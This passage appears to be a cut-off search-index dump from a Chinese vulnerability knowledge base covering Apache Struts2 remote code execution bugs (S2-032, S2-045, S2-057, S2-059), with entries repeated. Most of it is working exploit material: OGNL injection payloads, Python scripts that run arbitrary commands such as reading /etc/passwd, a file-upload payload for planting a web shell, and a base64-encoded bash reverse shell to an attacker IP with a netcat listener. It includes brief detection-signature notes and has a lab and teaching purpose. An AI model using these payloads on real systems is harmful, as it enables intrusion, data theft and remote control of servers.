2.3.28\uff082.3.20.3\u548c2.3.24.3\u9664\u5916\uff09","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-032%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#exp","text":"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat /etc/passwd","title":"EXP"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 Struts 2.3.5 \u2013 Struts 2.3.31 Struts 2.5 \u2013 Struts 2.5.10 \u6f0f\u6d1e\u9a8c\u8bc1POC \u00b6 Content-Type:%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())} \u6f0f\u6d1e\u9a8c\u8bc1EXP \u00b6 import requests import sys import httplib def poc(url): httplib.HTTPConnection._http_vsn_str='HTTP/1.0' payload = \"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}\" headers = {} headers[\"Content-Type\"] = payload r = requests.get(url, headers=headers) if \"105059592\" in r.content: return True return False if __name__ == '__main__': if len(sys.argv) == 1: print \"python s2-045.py target\" sys.exit() elif poc(sys.argv[1]): print \"vulnerable\" else: print \"not vulnerable\" \u547d\u4ee4\u6267\u884cPOC \u00b6 Content-Type:%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \u547d\u4ee4\u6267\u884cEXP \u00b6 #!/usr/bin/python # -*- coding: utf-8 -*- import urllib2 import httplib def exploit(url, cmd): payload = \"%{(#_='multipart/form-data').\" payload += \"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\" payload += \"(#_memberAccess?\" payload += \"(#_memberAccess=#dm):\" payload += \"((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\" payload += \"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\" payload += \"(#ognlUtil.getExcludedPackageNames().clear()).\" payload += \"(#ognlUtil.getExcludedClasses().clear()).\" payload += \"(#context.setMemberAccess(#dm)))).\" payload += \"(#cmd='%s').\" % cmd payload += \"(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\" payload += \"(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).\" payload += \"(#p=new java.lang.ProcessBuilder(#cmds)).\" payload += \"(#p.redirectErrorStream(true)).(#process=#p.start()).\" payload += \"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\" payload += \"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).\" payload += \"(#ros.flush())}\" try: headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload} request = urllib2.Request(url, headers=headers) page = urllib2.urlopen(request).read() except httplib.IncompleteRead, e: page = e.partial print(page) return page if __name__ == '__main__': import sys if len(sys.argv) != 3: print(\"[*] struts2_S2-045.py <url> <cmd>\") else: print('[*] CVE: 2017-5638 - Apache Struts2 S2-045') url = sys.argv[1] cmd = sys.argv[2] print(\"[*] cmd: %s\\n\" % cmd) exploit(url, cmd) GetShell POC\uff08\u6587\u4ef6\u4e0a\u4f20\uff09 \u00b6 GET\u5305\u4fee\u6539\u4e3aPOST\uff0c\u6dfb\u52a0\u53c2\u6570?f=a.jsp\uff0c\u5185\u5bb9\u4e3a\u60f3\u8981\u4e0a\u4f20\u7684\u5185\u5bb9\u5373\u53ef\u3002 _multipart/form-data%{(#o=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#o):((#c=#context['com.opensymphony.xwork2.ActionContext.container']).(#g=#c.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#g.getExcludedPackageNames().clear()).(#g.getExcludedClasses().clear()).(#context.setMemberAccess(#o)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#f=new java.io.File(#req.getRealPath('/'),#req.getParameter('f'))).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),new java.io.FileOutputStream(#f)))}","title":"Struts2 S2-045\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_1","text":"Struts 2.3.5 \u2013 Struts 2.3.31 Struts 2.5 \u2013 Struts 2.5.10","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc","text":"Content-Type:%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#exp","text":"import requests import sys import httplib def poc(url): httplib.HTTPConnection._http_vsn_str='HTTP/1.0' payload = \"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}\" headers = {} headers[\"Content-Type\"] = payload r = requests.get(url, headers=headers) if \"105059592\" in r.content: return True return False if __name__ == '__main__': if len(sys.argv) == 1: print \"python s2-045.py target\" sys.exit() elif poc(sys.argv[1]): print \"vulnerable\" else: print \"not vulnerable\"","title":"\u6f0f\u6d1e\u9a8c\u8bc1EXP"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc_1","text":"Content-Type:%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}","title":"\u547d\u4ee4\u6267\u884cPOC"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#exp_1","text":"#!/usr/bin/python # -*- coding: utf-8 -*- import urllib2 import httplib def exploit(url, cmd): payload = \"%{(#_='multipart/form-data').\" payload += \"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\" payload += \"(#_memberAccess?\" payload += \"(#_memberAccess=#dm):\" payload += \"((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\" payload += \"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\" payload += \"(#ognlUtil.getExcludedPackageNames().clear()).\" payload += \"(#ognlUtil.getExcludedClasses().clear()).\" payload += \"(#context.setMemberAccess(#dm)))).\" payload += \"(#cmd='%s').\" % cmd payload += \"(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\" payload += \"(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).\" payload += \"(#p=new java.lang.ProcessBuilder(#cmds)).\" payload += \"(#p.redirectErrorStream(true)).(#process=#p.start()).\" payload += \"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\" payload += \"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).\" payload += \"(#ros.flush())}\" try: headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload} request = urllib2.Request(url, headers=headers) page = urllib2.urlopen(request).read() except httplib.IncompleteRead, e: page = e.partial print(page) return page if __name__ == '__main__': import sys if len(sys.argv) != 3: print(\"[*] struts2_S2-045.py <url> <cmd>\") else: print('[*] CVE: 2017-5638 - Apache Struts2 S2-045') url = sys.argv[1] cmd = sys.argv[2] print(\"[*] cmd: %s\\n\" % cmd) exploit(url, cmd)","title":"\u547d\u4ee4\u6267\u884cEXP"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#getshell-poc","text":"GET\u5305\u4fee\u6539\u4e3aPOST\uff0c\u6dfb\u52a0\u53c2\u6570?f=a.jsp\uff0c\u5185\u5bb9\u4e3a\u60f3\u8981\u4e0a\u4f20\u7684\u5185\u5bb9\u5373\u53ef\u3002 _multipart/form-data%{(#o=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#o):((#c=#context['com.opensymphony.xwork2.ActionContext.container']).(#g=#c.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#g.getExcludedPackageNames().clear()).(#g.getExcludedClasses().clear()).(#context.setMemberAccess(#o)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#f=new java.io.File(#req.getRealPath('/'),#req.getParameter('f'))).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),new java.io.FileOutputStream(#f)))}","title":"GetShell POC\uff08\u6587\u4ef6\u4e0a\u4f20\uff09"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2018-11776%29/","text":"\u5f71\u54cd\u73af\u5883 \u00b6 Struts <= Struts 2.3.34, Struts 2.5.16 \u5229\u7528 \u00b6 S2-057\u8981\u6c42\u5177\u5907\u4ee5\u4e0b\u6761\u4ef6: action\u5143\u7d20\u6ca1\u6709\u8bbe\u7f6e\u540d\u79f0\u7a7a\u95f4\u5c5e\u6027\uff0c\u6216\u8005\u4f7f\u7528\u4e86\u901a\u914d\u7b26 \u540d\u79f0\u7a7a\u95f4\u5c06\u7531\u7528\u6237\u4eceuri\u4f20\u9012\u5e76\u89e3\u6790\u4e3aOGNL\u8868\u8fbe\u5f0f\uff0c\u6700\u7ec8\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002 Payload: http://your-ip:8080/%24%7b%31%2b%31%7d/actionChain1.action \u53ef\u4ee5\u770b\u5230\u7b97\u51fa\u4e861+1=2\u7684\u7ed3\u679c \u53c2\u8003POC \uff1a https://github.com/Fnzer0/S2-057-poc python 1.py -u http://192.168.111.129:8080/{{INJECTION_POINT}}/actionChain1.action -p S2-057-2 -c id --exp \u53d1\u73b0\u6267\u884c\u4e86id\u547d\u4ee4","title":"Struts2 S2-057 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2018-11776)"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2018-11776%29/#_1","text":"Struts <= Struts 2.3.34, Struts 2.5.16","title":"\u5f71\u54cd\u73af\u5883"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2018-11776%29/#_2","text":"S2-057\u8981\u6c42\u5177\u5907\u4ee5\u4e0b\u6761\u4ef6: action\u5143\u7d20\u6ca1\u6709\u8bbe\u7f6e\u540d\u79f0\u7a7a\u95f4\u5c5e\u6027\uff0c\u6216\u8005\u4f7f\u7528\u4e86\u901a\u914d\u7b26 \u540d\u79f0\u7a7a\u95f4\u5c06\u7531\u7528\u6237\u4eceuri\u4f20\u9012\u5e76\u89e3\u6790\u4e3aOGNL\u8868\u8fbe\u5f0f\uff0c\u6700\u7ec8\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002 Payload: http://your-ip:8080/%24%7b%31%2b%31%7d/actionChain1.action \u53ef\u4ee5\u770b\u5230\u7b97\u51fa\u4e861+1=2\u7684\u7ed3\u679c \u53c2\u8003POC \uff1a https://github.com/Fnzer0/S2-057-poc python 1.py -u http://192.168.111.129:8080/{{INJECTION_POINT}}/actionChain1.action -p S2-057-2 -c id --exp \u53d1\u73b0\u6267\u884c\u4e86id\u547d\u4ee4","title":"\u5229\u7528"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/","text":"\u4e00\u3001\u7b80\u4ecb \u00b6 2020\u5e7408\u670813\u65e5\uff0cApache\u5b98\u65b9\u53d1\u5e03\u4e86Struts2\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u7684\u98ce\u9669\u901a\u544a\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3aCVE-2019-0230\uff0c\u6f0f\u6d1e\u7b49\u7ea7\uff1a\u9ad8\u5371\uff0c\u6f0f\u6d1e\u8bc4\u5206\uff1a8.5 \u4e8c\u3001\u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Struts2\u662f\u4e00\u4e2a\u57fa\u4e8eMVC\u8bbe\u8ba1\u6a21\u5f0f\u7684Web\u5e94\u7528\u6846\u67b6\uff0c\u5b83\u672c\u8d28\u4e0a\u76f8\u5f53\u4e8e\u4e00\u4e2aservlet\uff0c\u5728MVC\u8bbe\u8ba1\u6a21\u5f0f\u4e2d\uff0cStruts2\u4f5c\u4e3a\u63a7\u5236\u5668(Controller)\u6765\u5efa\u7acb\u6a21\u578b\u4e0e\u89c6\u56fe\u7684\u6570\u636e\u4ea4\u4e92\u3002 \u6f0f\u6d1e\u4ea7\u751f\u7684\u4e3b\u8981\u539f\u56e0\u662f\u56e0\u4e3aApache Struts\u6846\u67b6\u5728\u5f3a\u5236\u6267\u884c\u65f6\uff0c\u4f1a\u5bf9\u5206\u914d\u7ed9\u67d0\u4e9b\u6807\u7b7e\u5c5e\u6027(\u5982id)\u7684\u5c5e\u6027\u503c\u6267\u884c\u4e8c\u6b21ognl\u89e3\u6790\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u6076\u610f\u7684OGNL\u8868\u8fbe\u5f0f\uff0c\u5e76\u5c06\u5176\u8bbe\u7f6e\u5230\u53ef\u88ab\u5916\u90e8\u8f93\u5165\u8fdb\u884c\u4fee\u6539\uff0c\u4e14\u4f1a\u6267\u884cOGNL\u8868\u8fbe\u5f0f\u7684Struts2\u6807\u7b7e\u7684\u5c5e\u6027\u503c\uff0c\u5f15\u53d1OGNL\u8868\u8fbe\u5f0f\u89e3\u6790\uff0c\u6700\u7ec8\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u5f71\u54cd\u3002 \u4e09\u3001\u5f71\u54cd\u7248\u672c \u00b6 Struts 2.0.0 \u2013 Struts 2.5.20 \u56db\u3001\u6f0f\u6d1e\u590d\u73b0 \u00b6 \uff081\uff09\u6f0f\u6d1e\u73af\u5883 \u00b6 \u653b\u51fb\u673a\uff1a192.168.1.129 \u9776\u673a\uff1a 192.168.1.12 \u8fd9\u91cc\u4f7f\u7528vulhub\uff0c\u5f88\u65b9\u4fbf\u3002 docker-compose up -d \u542f\u52a8\u73af\u5883\u4e4b\u540e\u8bbf\u95eehttp://your-ip:8080 \uff082\uff09\u6f0f\u6d1e\u9a8c\u8bc1 \u7531\u4e8e\u8be5\u6f0f\u6d1e\u662f\u5b58\u5728\u89e3\u6790\u6f0f\u6d1e\uff0c\u4e5f\u5c31\u662f\u5bf9\u4e8e\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\u8fdb\u884c\u4e86\u4e8c\u6b21\u5904\u7406\u3002 \u4ece\u800c\u653b\u51fb\u8005\u5bf9\u8f93\u5165\u7684\u5185\u5bb9\u8fdb\u884c\u7279\u610f\u6784\u9020\uff0c\u7136\u540e\u5b9e\u73b0\u653b\u51fb\u6210\u3002 URL http://192.168.1.12:8080/?id=%25{2*3} \uff083\uff09\u6f0f\u6d1e\u590d\u73b0 \u6784\u9020POC \u7528\u6765\u53cd\u5f39shell \u8fd9\u91cc\u8981\u4fee\u6539\u4e24\u4e2a\u5730\u65b9\uff1a 1.\u9776\u673aIP 192.168.1.12 2.\u653b\u51fb\u673aIP\u53cd\u5f39shell base64\u7f16\u7801 bash -i >& /dev/tcp/192.168.1.129/6666 0>&1 import` `requests``url ``=` `\"http://192.168.1.12:8080\"``data1 ``=` `{`` ``\"id\"``: ``\"%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}\"``}``data2 ``=` `{`` ``\"id\"``: ``\"%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTIvNjY2NiAwPiYxCg==}|{base64,-d}|{bash,-i}'))}\"``}``res1 ``=` `requests.post(url, data``=``data1)``res2 ``=` `requests.post(url, data``=``data2) 1.\u76d1\u542c\u7aef\u53e3 nc -lvvp 6666 2.\u8fd0\u884c\u811a\u672c python3 payload.py 3.\u53cd\u5f39shell \u4e94\u3001\u6f0f\u6d1e\u5206\u6790 \u00b6 \u653b\u51fb\u7684\u65f6\u5019\u6293\u53d6\u6570\u636e\u5305 \u516d\u3001\u7279\u5f81\u63d0\u53d6 \u00b6 \u4ece\u653b\u51fb\u6570\u636e\u5305\u91cc\u53ef\u4ee5\u5f88\u6e05\u695a\u7684\u770b\u5230\uff0c\u653b\u51fb\u8005\u901a\u8fc7id\u503c=xxx\uff0c\u6765\u4f20\u5165\u6076\u610f\u7684payload\uff0c \u5176\u4e2d %25\u662f % \uff0c%7B\u662f{\uff0c%7D\u662f} \u800c\u8bf7\u6c42\u5305\u4e2d\u5305\u542bpayload\uff0c\u4f8b\u5982suricata\u89c4\u5219\u4e2d\u53ef\u4ee5\u7528content\u6765\u5339\u914d\u3002 \u6211\u4eec\u8fd8\u662f\u5148\u5bf9\u53d1\u9001\u5305\u8fdb\u884cURL\u89e3\u7801: id``=%{(``#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))} \u8fd9\u6837\u5c31\u5f88\u6e05\u6670\u4e86\uff0c\u53ef\u4ee5\u5f97\u5230\u53cc\u5411\u89c4\u5219\uff0c\u6765\u9632\u62a4\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u653b\u51fb\u3002 \u7279\u5f81 \u8bf4\u660e POST\u65b9\u5f0f http.method=POST \u72b6\u6001\u7801 200 \u8bf7\u6c42\u5934 \u5305\u542b % \u8bf7\u6c42\u5934 \u5305\u542b { \u8bf7\u6c42\u5934 \u5305\u542b } \u8bf7\u6c42\u5934\u5305\u542bpayload \u54cd\u5e94\u5934\u5305\u542bpayload","title":"\u4e00\u3001\u7b80\u4ecb"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/#_1","text":"2020\u5e7408\u670813\u65e5\uff0cApache\u5b98\u65b9\u53d1\u5e03\u4e86Struts2\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u7684\u98ce\u9669\u901a\u544a\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3aCVE-2019-0230\uff0c\u6f0f\u6d1e\u7b49\u7ea7\uff1a\u9ad8\u5371\uff0c\u6f0f\u6d1e\u8bc4\u5206\uff1a8.5","title":"\u4e00\u3001\u7b80\u4ecb"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/#_2","text":"Struts2\u662f\u4e00\u4e2a\u57fa\u4e8eMVC\u8bbe\u8ba1\u6a21\u5f0f\u7684Web\u5e94\u7528\u6846\u67b6\uff0c\u5b83\u672c\u8d28\u4e0a\u76f8\u5f53\u4e8e\u4e00\u4e2aservlet\uff0c\u5728MVC\u8bbe\u8ba1\u6a21\u5f0f\u4e2d\uff0cStruts2\u4f5c\u4e3a\u63a7\u5236\u5668(Controller)\u6765\u5efa\u7acb\u6a21\u578b\u4e0e\u89c6\u56fe\u7684\u6570\u636e\u4ea4\u4e92\u3002 \u6f0f\u6d1e\u4ea7\u751f\u7684\u4e3b\u8981\u539f\u56e0\u662f\u56e0\u4e3aApache Struts\u6846\u67b6\u5728\u5f3a\u5236\u6267\u884c\u65f6\uff0c\u4f1a\u5bf9\u5206\u914d\u7ed9\u67d0\u4e9b\u6807\u7b7e\u5c5e\u6027(\u5982id)\u7684\u5c5e\u6027\u503c\u6267\u884c\u4e8c\u6b21ognl\u89e3\u6790\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u6076\u610f\u7684OGNL\u8868\u8fbe\u5f0f\uff0c\u5e76\u5c06\u5176\u8bbe\u7f6e\u5230\u53ef\u88ab\u5916\u90e8\u8f93\u5165\u8fdb\u884c\u4fee\u6539\uff0c\u4e14\u4f1a\u6267\u884cOGNL\u8868\u8fbe\u5f0f\u7684Struts2\u6807\u7b7e\u7684\u5c5e\u6027\u503c\uff0c\u5f15\u53d1OGNL\u8868\u8fbe\u5f0f\u89e3\u6790\uff0c\u6700\u7ec8\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u5f71\u54cd\u3002","title":"\u4e8c\u3001\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/#_3","text":"Struts 2.0.0 \u2013 Struts 2.5.20","title":"\u4e09\u3001\u5f71\u54cd\u7248\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/#_4","text":"","title":"\u56db\u3001\u6f0f\u6d1e\u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/#1","text":"\u653b\u51fb\u673a\uff1a192.168.1.129 \u9776\u673a\uff1a 192.168.1.12 \u8fd9\u91cc\u4f7f\u7528vulhub\uff0c\u5f88\u65b9\u4fbf\u3002 docker-compose up -d \u542f\u52a8\u73af\u5883\u4e4b\u540e\u8bbf\u95eehttp://your-ip:8080 \uff082\uff09\u6f0f\u6d1e\u9a8c\u8bc1 \u7531\u4e8e\u8be5\u6f0f\u6d1e\u662f\u5b58\u5728\u89e3\u6790\u6f0f\u6d1e\uff0c\u4e5f\u5c31\u662f\u5bf9\u4e8e\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\u8fdb\u884c\u4e86\u4e8c\u6b21\u5904\u7406\u3002 \u4ece\u800c\u653b\u51fb\u8005\u5bf9\u8f93\u5165\u7684\u5185\u5bb9\u8fdb\u884c\u7279\u610f\u6784\u9020\uff0c\u7136\u540e\u5b9e\u73b0\u653b\u51fb\u6210\u3002 URL http://192.168.1.12:8080/?id=%25{2*3} \uff083\uff09\u6f0f\u6d1e\u590d\u73b0 \u6784\u9020POC \u7528\u6765\u53cd\u5f39shell \u8fd9\u91cc\u8981\u4fee\u6539\u4e24\u4e2a\u5730\u65b9\uff1a 1.\u9776\u673aIP 192.168.1.12 2.\u653b\u51fb\u673aIP\u53cd\u5f39shell base64\u7f16\u7801 bash -i >& /dev/tcp/192.168.1.129/6666 0>&1 import` `requests``url ``=` `\"http://192.168.1.12:8080\"``data1 ``=` `{`` ``\"id\"``: ``\"%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}\"``}``data2 ``=` `{`` ``\"id\"``: 